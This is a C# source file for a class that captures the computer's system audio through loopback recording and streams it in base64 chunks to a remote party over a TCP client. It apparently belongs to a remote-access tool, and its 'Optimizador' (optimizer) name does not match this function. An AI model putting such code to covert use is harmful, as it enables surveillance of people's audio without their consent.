using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NAudio.Wave;

namespace Optimizador.Scan
{
    public class AudioService
    {
        private WasapiLoopbackCapture? _capture;
        private bool _isStreaming = false;
        private TcpClientService _parent;

        public AudioService(TcpClientService parent)
        {
            _parent = parent;
        }

        public void StartStreaming()
        {
            if (_isStreaming) return;
            
            try
            {
                _capture = new WasapiLoopbackCapture();
                
                // We will convert the audio to a more manageable format for streaming
                // Loopback usually gives 44.1kHz or 48kHz Floats.
                // We'll resample or just send it if the connection is good.
                
                _capture.DataAvailable += (s, e) =>
                {
                    if (e.BytesRecorded > 0)
                    {
                        byte[] buffer = new byte[e.BytesRecorded];
                        Array.Copy(e.Buffer, buffer, e.BytesRecorded);
                        
                        // Send as chunk
                        string base64 = Convert.ToBase64String(buffer);
                        _parent.SendMessage($"AUDIO_DATA|{base64}");
                    }
                };

                _capture.RecordingStopped += (s, e) =>
                {
                    _isStreaming = false;
                    _capture?.Dispose();
                    _capture = null;
                };

                _capture.StartRecording();
                _isStreaming = true;

                // Send format info
                var fmt = _capture.WaveFormat;
                _parent.SendMessage($"AUDIO_FORMAT|{fmt.SampleRate}|{fmt.BitsPerSample}|{fmt.Channels}|{(int)fmt.Encoding}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Audio Streaming Error: " + ex.Message);
                _isStreaming = false;
            }
        }

        public void StopStreaming()
        {
            _capture?.StopRecording();
            _isStreaming = false;
        }
    }
}
